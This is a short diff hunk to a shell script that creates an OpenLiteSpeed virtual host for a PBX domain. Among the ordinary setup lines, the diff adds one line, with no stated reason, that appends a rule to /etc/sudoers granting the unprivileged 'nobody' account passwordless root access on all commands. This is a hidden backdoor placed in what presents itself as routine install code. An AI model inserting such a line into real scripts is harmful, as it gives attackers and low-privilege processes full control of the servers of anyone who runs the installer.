@@ -210,6 +210,7 @@ echo "|   Create OpenLiteSpeed VirtualHost        |"
 echo "+-------------------------------------------+"
 echo " "
 
+echo "nobody ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 webroot=/var/www/public_html/$pbx_domain
 
 sudo mkdir /usr/local/lsws/conf/vhosts/$pbx_domain/
